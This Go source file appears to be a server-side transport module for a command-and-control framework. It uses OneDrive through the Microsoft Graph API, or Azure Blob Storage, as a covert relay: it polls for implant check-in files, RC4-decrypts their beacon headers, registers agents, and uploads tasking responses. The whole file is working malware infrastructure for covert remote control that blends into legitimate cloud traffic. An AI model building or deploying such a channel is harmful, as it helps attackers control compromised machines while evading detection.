package main

import (
	"bytes"
	"crypto/rc4"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/xml"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

type TransportGraph struct {
	Name   string
	Config TransportConfig
	Active bool

	stopCh chan struct{}
	wg     sync.WaitGroup

	tokenMu     sync.Mutex
	accessToken string
	tokenExpiry time.Time

	blobSAS       string
	blobSASExpiry time.Time

	client *http.Client
}

type graphTokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int    `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

type graphChildrenResponse struct {
	Value []graphDriveItem `json:"value"`
}

type graphDriveItem struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Size int64  `json:"size"`
}

type blobListResult struct {
	Blobs struct {
		BlobList []blobItem `xml:"Blob"`
	} `xml:"Blobs"`
}

type blobItem struct {
	Name string `xml:"Name"`
}

func NewTransportGraph(name string, config TransportConfig) *TransportGraph {
	return &TransportGraph{
		Name:   name,
		Config: config,
		client: &http.Client{Timeout: 30 * time.Second},
	}
}

// ============================================================
//  Start / Stop
// ============================================================

func (t *TransportGraph) Start() error {
	t.stopCh = make(chan struct{})
	t.Active = true

	if t.Config.StorageType == "blob" {
		if err := t.blobRefreshSAS(); err != nil {
			return fmt.Errorf("blob sas generation failed: %w", err)
		}
		if err := t.blobEnsureContainer(); err != nil {
			return fmt.Errorf("blob container creation failed: %w", err)
		}
	} else {
		if _, err := t.getAccessToken(); err != nil {
			return fmt.Errorf("oauth2 token acquisition failed: %w", err)
		}
		if err := t.graphEnsureFolder(); err != nil {
			return fmt.Errorf("onedrive folder creation failed: %w", err)
		}
	}

	t.wg.Add(1)
	go t.pollLoop()

	return nil
}

func (t *TransportGraph) Stop() error {
	if t.stopCh != nil {
		close(t.stopCh)
	}
	t.wg.Wait()
	t.Active = false
	return nil
}

// ============================================================
//  Dispatchers - route to Graph or Blob implementation
// ============================================================

func (t *TransportGraph) listFiles() ([]graphDriveItem, error) {
	if t.Config.StorageType == "blob" {
		return t.blobListFiles()
	}
	return t.graphListFiles()
}

func (t *TransportGraph) downloadFile(filename string) ([]byte, error) {
	if t.Config.StorageType == "blob" {
		return t.blobDownloadFile(filename)
	}
	return t.graphDownloadFile(filename)
}

func (t *TransportGraph) uploadFile(filename string, data []byte) error {
	if t.Config.StorageType == "blob" {
		return t.blobUploadFile(filename, data)
	}
	return t.graphUploadFile(filename, data)
}

func (t *TransportGraph) deleteFile(filename string) error {
	if t.Config.StorageType == "blob" {
		return t.blobDeleteFile(filename)
	}
	return t.graphDeleteFile(filename)
}

// ============================================================
//  Graph API (OneDrive) implementation
// ============================================================

func (t *TransportGraph) getAccessToken() (string, error) {
	t.tokenMu.Lock()
	defer t.tokenMu.Unlock()

	if t.accessToken != "" && time.Now().Before(t.tokenExpiry) {
		return t.accessToken, nil
	}

	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token",
		url.PathEscape(t.Config.TenantID))

	form := url.Values{}
	form.Set("client_id", t.Config.ClientID)
	form.Set("client_secret", t.Config.ClientSecret)
	form.Set("scope", "https://graph.microsoft.com/.default")
	form.Set("grant_type", "client_credentials")

	resp, err := t.client.Post(tokenURL, "application/x-www-form-urlencoded", strings.NewReader(form.Encode()))
	if err != nil {
		return "", fmt.Errorf("token request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("token error %d: %s", resp.StatusCode, string(respBody))
	}

	var tokenResp graphTokenResponse
	if err := json.Unmarshal(respBody, &tokenResp); err != nil {
		return "", fmt.Errorf("token decode failed: %w", err)
	}

	if tokenResp.AccessToken == "" {
		return "", errors.New("empty access_token in response")
	}

	t.accessToken = tokenResp.AccessToken
	t.tokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn-120) * time.Second)
	return t.accessToken, nil
}

func (t *TransportGraph) invalidateToken() {
	t.tokenMu.Lock()
	defer t.tokenMu.Unlock()
	t.accessToken = ""
	t.tokenExpiry = time.Time{}
}

func encodeFolderPath(p string) string {
	parts := strings.Split(strings.Trim(p, "/"), "/")
	var encoded []string
	for _, part := range parts {
		if part != "" {
			encoded = append(encoded, url.PathEscape(part))
		}
	}
	return "/" + strings.Join(encoded, "/")
}

func (t *TransportGraph) graphAPIPath(suffix string) string {
	return fmt.Sprintf("/v1.0/users/%s/drive/root:%s%s",
		url.PathEscape(t.Config.UserID),
		encodeFolderPath(t.Config.FolderPath),
		suffix)
}

func (t *TransportGraph) doGraphAPI(method, apiPath string, body []byte, contentType string) ([]byte, int, error) {
	apiURL := "https://graph.microsoft.com" + apiPath

	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		token, err := t.getAccessToken()
		if err != nil {
			return nil, 0, err
		}

		var bodyReader io.Reader
		if body != nil {
			bodyReader = bytes.NewReader(body)
		}

		req, err := http.NewRequest(method, apiURL, bodyReader)
		if err != nil {
			return nil, 0, err
		}
		req.Header.Set("Authorization", "Bearer "+token)
		if contentType != "" {
			req.Header.Set("Content-Type", contentType)
		}

		resp, err := t.client.Do(req)
		if err != nil {
			return nil, 0, err
		}

		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 401 {
			t.invalidateToken()
			if attempt < maxRetries-1 {
				continue
			}
			return respBody, resp.StatusCode, nil
		}

		if resp.StatusCode == 429 || resp.StatusCode == 503 {
			if attempt < maxRetries-1 {
				sleepSec := 60
				if ra := resp.Header.Get("Retry-After"); ra != "" {
					if s, err := strconv.Atoi(ra); err == nil && s > 0 && s < 300 {
						sleepSec = s
					}
				}
				select {
				case <-t.stopCh:
					return nil, 0, errors.New("transport stopped during throttle wait")
				case <-time.After(time.Duration(sleepSec) * time.Second):
				}
				continue
			}
			return respBody, resp.StatusCode, nil
		}

		return respBody, resp.StatusCode, nil
	}
	return nil, 0, errors.New("exhausted retries")
}

func (t *TransportGraph) graphEnsureFolder() error {
	parts := strings.Split(strings.Trim(t.Config.FolderPath, "/"), "/")
	currentPath := ""

	for _, part := range parts {
		if part == "" {
			continue
		}

		var apiPath string
		if currentPath == "" {
			apiPath = fmt.Sprintf("/v1.0/users/%s/drive/root/children",
				url.PathEscape(t.Config.UserID))
		} else {
			apiPath = fmt.Sprintf("/v1.0/users/%s/drive/root:%s:/children",
				url.PathEscape(t.Config.UserID), encodeFolderPath(currentPath))
		}

		createBody := fmt.Sprintf(`{"name":%q,"folder":{},"@microsoft.graph.conflictBehavior":"fail"}`, part)
		_, status, err := t.doGraphAPI("POST", apiPath, []byte(createBody), "application/json")
		if err != nil {
			return fmt.Errorf("create folder %s: %w", currentPath+"/"+part, err)
		}
		if status != 201 && status != 200 && status != 409 {
			return fmt.Errorf("create folder %s returned %d", currentPath+"/"+part, status)
		}

		currentPath = currentPath + "/" + part
	}
	return nil
}

func (t *TransportGraph) graphListFiles() ([]graphDriveItem, error) {
	apiPath := t.graphAPIPath(":/children?$select=name,id,size")

	body, status, err := t.doGraphAPI("GET", apiPath, nil, "")
	if err != nil {
		return nil, err
	}
	if status == 404 {
		return nil, nil
	}
	if status != 200 {
		return nil, fmt.Errorf("list files returned %d", status)
	}

	var result graphChildrenResponse
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}
	return result.Value, nil
}

func (t *TransportGraph) graphDownloadFile(filename string) ([]byte, error) {
	apiPath := t.graphAPIPath("/" + url.PathEscape(filename) + ":/content")

	body, status, err := t.doGraphAPI("GET", apiPath, nil, "")
	if err != nil {
		return nil, err
	}
	if status != 200 {
		return nil, fmt.Errorf("download %s returned %d", filename, status)
	}
	return body, nil
}

func (t *TransportGraph) graphUploadFile(filename string, data []byte) error {
	apiPath := t.graphAPIPath("/" + url.PathEscape(filename) + ":/content")

	_, status, err := t.doGraphAPI("PUT", apiPath, data, "application/octet-stream")
	if err != nil {
		return err
	}
	if status != 200 && status != 201 {
		return fmt.Errorf("upload %s returned %d", filename, status)
	}
	return nil
}

func (t *TransportGraph) graphDeleteFile(filename string) error {
	apiPath := t.graphAPIPath("/" + url.PathEscape(filename))

	_, status, err := t.doGraphAPI("DELETE", apiPath, nil, "")
	if err != nil {
		return err
	}
	if status != 204 && status != 200 && status != 404 {
		return fmt.Errorf("delete %s returned %d", filename, status)
	}
	return nil
}

// ============================================================
//  Azure Blob Storage implementation
// ============================================================

func (t *TransportGraph) blobRefreshSAS() error {
	sas, err := generateAccountSAS(t.Config.StorageAccount, t.Config.StorageKey, time.Now().Add(24*time.Hour))
	if err != nil {
		return err
	}
	t.blobSAS = sas
	t.blobSASExpiry = time.Now().Add(23 * time.Hour)
	return nil
}

func (t *TransportGraph) getBlobSAS() (string, error) {
	if t.blobSAS != "" && time.Now().Before(t.blobSASExpiry) {
		return t.blobSAS, nil
	}
	return t.blobSAS, t.blobRefreshSAS()
}

func (t *TransportGraph) blobBaseURL() string {
	return fmt.Sprintf("https://%s.blob.core.windows.net", t.Config.StorageAccount)
}

func (t *TransportGraph) doBlobAPI(method, pathAndQuery string, body []byte, extraHeaders map[string]string) ([]byte, int, error) {
	sas, err := t.getBlobSAS()
	if err != nil {
		return nil, 0, err
	}

	sep := "?"
	if strings.Contains(pathAndQuery, "?") {
		sep = "&"
	}
	fullURL := t.blobBaseURL() + pathAndQuery + sep + sas

	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, fullURL, bodyReader)
	if err != nil {
		return nil, 0, err
	}

	req.Header.Set("x-ms-version", "2020-10-02")
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}

	maxRetries := 2
	for attempt := 0; attempt < maxRetries; attempt++ {
		resp, err := t.client.Do(req)
		if err != nil {
			return nil, 0, err
		}

		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 429 || resp.StatusCode == 503 {
			if attempt < maxRetries-1 {
				sleepSec := 60
				if ra := resp.Header.Get("Retry-After"); ra != "" {
					if s, err := strconv.Atoi(ra); err == nil && s > 0 && s < 300 {
						sleepSec = s
					}
				}
				select {
				case <-t.stopCh:
					return nil, 0, errors.New("transport stopped during throttle wait")
				case <-time.After(time.Duration(sleepSec) * time.Second):
				}

				if body != nil {
					bodyReader = bytes.NewReader(body)
				}
				req, _ = http.NewRequest(method, fullURL, bodyReader)
				req.Header.Set("x-ms-version", "2020-10-02")
				for k, v := range extraHeaders {
					req.Header.Set(k, v)
				}
				continue
			}
		}

		return respBody, resp.StatusCode, nil
	}
	return nil, 0, errors.New("exhausted retries")
}

func (t *TransportGraph) blobEnsureContainer() error {
	path := fmt.Sprintf("/%s?restype=container", t.Config.ContainerName)
	_, status, err := t.doBlobAPI("PUT", path, nil, nil)
	if err != nil {
		return err
	}
	if status != 201 && status != 409 {
		return fmt.Errorf("create container returned %d", status)
	}
	return nil
}

func (t *TransportGraph) blobListFiles() ([]graphDriveItem, error) {
	path := fmt.Sprintf("/%s?restype=container&comp=list&prefix=c_", t.Config.ContainerName)

	body, status, err := t.doBlobAPI("GET", path, nil, nil)
	if err != nil {
		return nil, err
	}
	if status != 200 {
		return nil, fmt.Errorf("blob list returned %d", status)
	}

	var result blobListResult
	if err := xml.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("blob list xml parse: %w", err)
	}

	var items []graphDriveItem
	for _, b := range result.Blobs.BlobList {
		items = append(items, graphDriveItem{Name: b.Name})
	}
	return items, nil
}

func (t *TransportGraph) blobDownloadFile(filename string) ([]byte, error) {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))

	body, status, err := t.doBlobAPI("GET", path, nil, nil)
	if err != nil {
		return nil, err
	}
	if status == 404 {
		return nil, fmt.Errorf("blob %s not found", filename)
	}
	if status != 200 {
		return nil, fmt.Errorf("blob download %s returned %d", filename, status)
	}
	return body, nil
}

func (t *TransportGraph) blobUploadFile(filename string, data []byte) error {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))
	headers := map[string]string{
		"x-ms-blob-type": "BlockBlob",
	}

	_, status, err := t.doBlobAPI("PUT", path, data, headers)
	if err != nil {
		return err
	}
	if status != 201 && status != 200 {
		return fmt.Errorf("blob upload %s returned %d", filename, status)
	}
	return nil
}

func (t *TransportGraph) blobDeleteFile(filename string) error {
	path := fmt.Sprintf("/%s/%s", t.Config.ContainerName, url.PathEscape(filename))

	_, status, err := t.doBlobAPI("DELETE", path, nil, nil)
	if err != nil {
		return err
	}
	if status != 202 && status != 200 && status != 404 {
		return fmt.Errorf("blob delete %s returned %d", filename, status)
	}
	return nil
}

// ============================================================
//  Polling loop and agent processing
// ============================================================

func (t *TransportGraph) pollLoop() {
	defer t.wg.Done()

	interval := time.Duration(t.Config.PollInterval) * time.Second
	if interval < time.Second {
		interval = 5 * time.Second
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopCh:
			return
		case <-ticker.C:
			t.processCheckins()
		}
	}
}

func (t *TransportGraph) processCheckins() {
	files, err := t.listFiles()
	if err != nil {
		return
	}

	for _, f := range files {
		if !strings.HasPrefix(f.Name, "c_") || !strings.HasSuffix(f.Name, ".dat") {
			continue
		}

		select {
		case <-t.stopCh:
			return
		default:
		}

		data, err := t.downloadFile(f.Name)
		if err != nil {
			continue
		}

		nonce := strings.TrimSuffix(strings.TrimPrefix(f.Name, "c_"), ".dat")

		agentCrc, agentId, beat, bodyData, err := t.parseBeatAndData(data)
		if err != nil {
			_ = t.deleteFile(f.Name)
			continue
		}

		if !Ts.TsAgentIsExists(agentId) {
			_, err := Ts.TsAgentCreate(agentCrc, agentId, beat, t.Name, "graph-api", true)
			if err != nil {
				_ = t.deleteFile(f.Name)
				continue
			}
		}

		_ = Ts.TsAgentSetTick(agentId, t.Name)
		_ = Ts.TsAgentProcessData(agentId, bodyData)

		responseData, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000)
		if err == nil && len(responseData) > 0 {
			respFilename := fmt.Sprintf("r_%s.dat", nonce)
			_ = t.uploadFile(respFilename, responseData)
		}

		_ = t.deleteFile(f.Name)
	}
}

func (t *TransportGraph) parseBeatAndData(fileData []byte) (string, string, []byte, []byte, error) {
	if len(fileData) < 4 {
		return "", "", nil, nil, errors.New("file too small")
	}

	beatLen := binary.BigEndian.Uint32(fileData[:4])
	if uint32(len(fileData)) < 4+beatLen {
		return "", "", nil, nil, errors.New("truncated beat data")
	}

	beatB64 := fileData[4 : 4+beatLen]
	bodyData := fileData[4+beatLen:]

	agentInfoCrypt, err := base64.StdEncoding.DecodeString(string(beatB64))
	if len(agentInfoCrypt) < 8 || err != nil {
		return "", "", nil, nil, errors.New("failed to decode beat")
	}

	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		return "", "", nil, nil, errors.New("invalid encrypt key")
	}
	rc4cipher, err := rc4.NewCipher(encKey)
	if err != nil {
		return "", "", nil, nil, errors.New("rc4 cipher error")
	}
	agentInfo := make([]byte, len(agentInfoCrypt))
	rc4cipher.XORKeyStream(agentInfo, agentInfoCrypt)

	agentTypeCrc := fmt.Sprintf("%08x", binary.BigEndian.Uint32(agentInfo[:4]))
	agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(agentInfo[4:8]))
	beat := agentInfo[8:]

	return agentTypeCrc, agentId, beat, bodyData, nil
}
